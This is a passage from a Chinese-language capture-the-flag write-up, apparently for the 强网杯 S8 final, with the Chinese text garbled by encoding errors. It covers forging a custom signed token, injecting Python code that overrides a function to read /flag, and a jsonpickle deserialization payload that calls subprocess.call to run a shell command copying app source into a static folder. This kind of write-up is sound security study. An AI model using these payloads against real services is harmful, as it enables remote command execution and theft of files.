punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>            hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>inputdata<span class="token punctuation">)</span>  <span class="token comment"># data</span>            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>            <span class="token keyword">return</span> encoded_data        <span class="token keyword">def</span> <span class="token function">sign_data</span><span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>    <span class="token comment"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>    data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    signature <span class="token operator">=</span> pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>hash_obj<span class="token punctuation">)</span>    <span class="token keyword">return</span> signature<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ˜¯decode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_decode</span><span class="token punctuation">(</span>encode_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        all_data <span class="token operator">=</span> encode_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>        sig_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>        alg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> secret        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>        <span class="token comment"># éªŒè¯ç­¾å</span>        is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span>        <span class="token keyword">if</span> is_valid<span class="token punctuation">:</span>            <span class="token keyword">return</span> json_data        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> <span class="token string">"something error"</span>        <span class="token keyword">def</span> <span class="token function">verify_signature</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>        rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token comment"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>        data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>hash_obj<span class="token punctuation">,</span> signature<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is valid. Transmitted data:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is invalid."</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">elif</span> alg <span class="token operator">==</span> <span class="token string">'HS'</span><span class="token punctuation">:</span>        hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>        data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>        hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>        hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hex_dig <span class="token operator">==</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€å¼€å§‹çœ‹åˆ°æœ‰ RS æœ‰ HSï¼Œæ¬¸æ˜¯ä¸æ˜¯è¦æ‰“ RS è½¬ HS çš„ trick ğŸ¤“ğŸ‘†</p><p>æ‹¿ä¸ª token è§£ç æµ‹è¯•ä¸€ä¸‹</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;"username": "aaa", "password": "123"&#125;iÃ›Ã•`Ã˜&#125;Â£P5Ã€..Ã¯.ÃŒ.Â¬?%ÃÂºFU=Ã—.UT.Ã¨57 a8ÃÂ¿./Ã²LkntÃ£Ã_Â©....Ã mÂ¥Â£.Ã -uqÃ°~ÂºÃ€Â¦Ã•.Â·.Ã¤ÃƒÂº...0..Â¿#ÃÃ’fVuÂºÃ”Ã™gdÃ°Ãµ%Ã†Ã¬y.ÃŒ.Â«..v.Â§~..cÃŸÃ Â®Â².=Ã™q#.0Ã²..Q.Â¬Ã».WÃŒÂ¶Âº0Ã”.Â¼Ã«Ã¶Ã¾)Â¨.Ã²OÃ›?Ã½vÂ´Â¦.Ã‹7.d...Ã˜cÂ©.Ã©..1..%Ã±.9Ã¡&#125;Ã–Ã».NÃ‚.Â¤v.Ã¼6.Ã‚ÃY.vÂ¿.Ã°fÃ¢....Ã„Â²Â¬|Ã‡Â´Â½.Âº.O.jÃ®Ã­Ãq.Â®G`ÃŠ.Ã¯Ã…Ã‹hÃ£.Â¯.&lt;\zÂ¯Ã¥Â¨.~q2Ã¨|Ã„[Ã£p.&lt;Â®Ã§Â².Ã¹RS-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0IdDl+WgYW49pk+UCoYypX4SPvon3Pc9uNgM6htf63pYUKnqcFjm0LqAd5q/+t5Ut5L1P98IZRyRjYF/W98WrLWQpG2Y2WiQ4/stCx/qtCg+UGoG7ItWMKrUAWxjjwzqun++yZIQ02AeLJzUSbC+uEEBqvzkXrr4FJvPHpIbWU/hE23nEmRL5pze8I7zym7M38Q3doOPSTsQV15b0Kcppt5Fvn3TxQAlWmdARk0sY0GbR/oo80eniQvIlswbPGeORgldbXLY1IAusaTiIenQJVU9+//+D9m7OZdoGOeqPLJ7jns9bTX8qwkjtuH0pDREK4Rr+vBFYKSc/TfXraNc+wIDAQAB-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°RSåŠ å¯†çš„å…¬é’¥</p><p>ä¸‹æ–­ç‚¹çœ‹ä¸€ä¸‹all_data</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">0</span> <span class="token operator">=</span><span class="token string">'eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMTIzIn0='</span><span class="token number">1</span> <span class="token operator">=</span><span class="token string">'nDnHSpDbV3CVBn24/aZQc3lOdxQug5w5zj93isQYXyViMeRLqNPu53sZNGxEjL2rd55B4H7Cc+gQ2x4f/NcZQ8ACVDgtQe5C4be1y7uan2qitc4eQGCkbmmDQeogdJteJCzHeZaePp3Vg9/+U+588A1eQS1/UG5vDawVGLel5UYH6nmZha0zZ2CbrNBbbu3SPaeGDsj/mJscssETStFGx8iEYra3eYh9L3ugEUcP/7D4EVi1EKeu98Mc6IwnwjgxsdmihpuZRZlSI1NUi+TfbjLBLb57WH9dhKOQAr06xO/HhL3U73D8kdVCKCWXMolZZXw8eIkfuvS+5QUNWM7DwQ=='</span><span class="token number">2</span> <span class="token operator">=</span><span class="token string">'UlM='</span><span class="token number">3</span> <span class="token operator">=</span><span class="token string">'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyZVVmNzNDVlJPL3RwYjVLSnQ0QgptY2xDSUtWMXNrZGtkQWcwS2I5RGlrRjREeXBwODFLb0hFd2VIUUxRS0RnR0RzZnpQeFI4Qm1vQmV1TlBVZkg2CkRuVDdEQ2dRSlVpaDBVd3hRYVprZWprWW9kY1RZTG9QSlpZK1BnSjRaKzFNZWFOK1FFRG1aUjEzTU5kMy9OaE0KejY3Tk1GYWVaVm1LN2FQQzh5blJXRzVPbFZpU0JDNDUxOG9TcVhsRkx3MU5CR2pnb1N2ZS9FU2VoUStuTlUvdgpwaU1sNnVtUzhZbjlZVytrMU0vbGJ3TWc1N3lydXRGYVh2WmllUG4zSENrd0YzTUF0RkpadEVOL3huaU1FU3pPClZBVmFYZ3EwWHVTYXJZSXU4b2dvU2Q4MUdLNGJmWHdscTZWbXNWSExQRFBvMkRrTmcxS1B2L1Erd05vbHI1SlkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>å¥½çŒœæµ‹è¦è®©è§£å¯†æ–¹å¼ä¸º HS</del></p><p>0 æ”¹ä¸º eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ&#x3D;&#x3D;</p><p>2 æ”¹ä¸º SFM&#x3D;&#x3D;</p><p><del>ç­¾åéƒ¨åˆ†å°±æ˜¯è·å–çš„å…¬é’¥</del></p><p>æ„é€ å‡ºjwtï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ<span class="token operator">==</span><span class="token punctuation">.</span>SFM<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯å¤±è´¥äº†</p><p>è§‚å¯Ÿ HS çš„åŠ è§£å¯†éƒ¨åˆ†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># enc</span>hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># dec</span>hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¦å…ˆçŸ¥é“ secret çš„å€¼æ‰èƒ½ä¼ªé€ </p><br><p>è€Œä¸”è¿™é‡Œçš„åŠ å¯†é€»è¾‘éƒ½æ˜¯å®ƒè‡ªå·±å®ç°çš„ï¼Œä¸èƒ½å¥—ç”¨å¸¸è§„çš„ jwt æ€è·¯æŠŠ RS è½¬ä¸º HS</p><p>ä»”ç»†ä¸€çœ‹å¯¹ secret çš„æ“ä½œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> secret<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>    key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span><span class="token comment"># éªŒè¯ç­¾å</span>is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‰äº†ï¼Œè¿™é‡Œä¼ è¿›å»çš„ key å°±æ˜¯å…¬é’¥ï¼Œå’Œ secret æ²¡æœ‰åŠç‚¹å…³ç³»ï¼Œé‚£å°±ç®€å•äº†ï¼ŒåŠ è§£å¯†åªå’Œç®—æ³•æœ‰å…³</p><p>å°è¯•ç›´æ¥åœ¨æœ¬åœ°è§£é™¤é™åˆ¶ç”Ÿæˆ admin çš„ token ï¼Œå¸¦åˆ°é¶æœºä¸Šï¼Œå‘ç°å¯ä»¥ç™»å½•</p><p>ç„¶åå°±æ‹¿åˆ° exec äº†ï¼Œæ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯é¶æœºä¸å‡ºç½‘è€Œ <code>print(exec(code))</code> æ²¡æœ‰å›æ˜¾</p><p>ä¸€å¼€å§‹æƒ³çš„æ˜¯ç”¨ sctf çš„ trick åœ¨ wsgi server å†™å†…å­˜é©¬ï¼Œä½†æ˜¯æ•´äº†åŠå¤©æ‹¿ä¸åˆ°å…¨å±€ __globals__ï¼Œæµªè´¹äº†éå¸¸ä¹…çš„æ—¶é—´</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span><span class="token string">"server_version"</span><span class="token punctuation">,</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€åè¿˜æ˜¯é€‰æ‹©æ‰¾ä¸ªæœ‰è°ƒç”¨çš„æ–¹æ³•é‡å†™ï¼Œè¿™é‡Œé‡å†™ read_html æ–¹æ³•æ¥è¯»flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">util<span class="token punctuation">.</span>read_html<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token operator">+</span>filename<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token operator">+</span>f<span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241205132441508.png" alt="image-20241205132441508"></p><p>ç„¶åéšä¾¿è®¿é—®ä¸€ä¸ªè°ƒç”¨äº† read_html æ¥å£å³å¯å›æ˜¾</p><hr><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>å°è¯•ç™»å½•å¯ä»¥å¾—åˆ°è´¦å¯† guest:guest</p><p>ç™»å½•åå¾—åˆ° tokenï¼Œè§£ç å¾—åˆ°</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"__main__.Token"</span><span class="token punctuation">,</span> <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token number">1733378883.1952913</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é™¤æ­¤ä¹‹å¤–æ²¡æœ‰å…¶ä»–ä¿¡æ¯</p><p>py&#x2F;object çš„éƒ¨åˆ†æ˜¯æ•°æ®ç±»çš„å†™æ³•ï¼Œåœ¨è¿™é‡Œæµ‹äº†åŠå¤©ç±»ä¸€ç›´è¿”å›500</p><p>github ä¸Šæœäº†ä¸€ä¸‹æ‰¾åˆ°ä¸ªç›¸å…³çš„é¡¹ç›®ï¼š<a href="https://github.com/jsonpickle/jsonpickle">https://github.com/jsonpickle/jsonpickle</a></p><p>å’Œé˜Ÿå‹è®¨è®ºäº†å¾ˆä¹…ä¹‹åçŒœæµ‹æ˜¯åœ¨ timestamp ä¸Šåšæ–‡ç« ï¼Œå› ä¸ºæ¯æ¬¡ç™»å½•ä¹‹åéƒ½ä¼šç”Ÿæˆä¸€ä¸ª timestamp å¯ä»¥åå¤ä½¿ç”¨ï¼Œè¿”å› welcomeï¼Œè¿‡ä¸€é˜µæ—¶é—´åå°±ä¼šè¿”å› Invalid tokenï¼Œè€Œå½“æˆ‘ä»¬ç›´æ¥æŠŠ username æ”¹ä¸º admin çš„æ—¶å€™å°±ä¼šç›´æ¥è¿”å› Invalid token</p><p>äºæ˜¯éœ€è¦çˆ†ç ´ timestamp ï¼Œè¿™é‡Œæˆ‘äº¤ç»™é˜Ÿå‹ç”¨ yakit çˆ†å‡ºä¸€ä¸ª token å°±èƒ½æŒä¹…åŒ–ä½¿ç”¨äº†</p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206091629415.png" alt="image-20241206091629415"></p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206093000087.png" alt="image-20241206093000087"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>    <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span><span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå‘¢ï¼Œå¾ˆæ˜æ˜¾æ˜¯è¦æ‰“ jsonpickle äº†ï¼Œæœ‰å®˜æ–¹çš„ fuzzing æ–‡æ¡£ï¼š<a href="https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md">https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md</a></p><p>è²Œä¼¼æ²¡å•¥ç”¨</p><p>ç»§ç»­åœ¨ github ä¸Šæœç´¢ï¼š</p><p><a href="https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md">https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md</a></p><p><a href="https://github.com/VerSprite/flask-json-pickle">https://github.com/VerSprite/flask-json-pickle</a></p><p><a href="https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/">https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/</a></p><p>æµ‹è¯•å‘ç° ban äº† reduceã€tupleï¼Œä¸è¿‡æ³¨æ„åˆ° py&#x2F;object è¿™é‡Œèƒ½è‡ªå·±é€‰æ‹©ç±»ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘ç›´æ¥è°ƒç”¨å‘½ä»¤æ‰§è¡Œç±»<code>subprocess.call</code></p><p>ä¼ å…¥å‚æ•°å¯ä»¥ç”¨ py&#x2F;newargsex</p><p>æ— å›æ˜¾ï¼Œä¸€å¼€å§‹æƒ³ç”¨ç›²æ³¨è¯»æ–‡ä»¶çš„ï¼Œä½†æ˜¯å‘ç°åæ–œæ è¢« ban äº†ï¼Œé‚£ä¹ˆå°±å¾ˆéš¾æäº†</p><p>æµ‹è¯•å‘ç°æœ‰ä¸ª static æ–‡ä»¶å¤¹å¯ä»¥è®¿é—®ï¼Œé‚£ä¹ˆç›´æ¥å¸¦å¤–</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"subprocess.call"</span><span class="token punctuation">,</span> <span class="token property">"py/newargsex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat$&#123;IFS&#125;/app/app.py>/app/static/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token 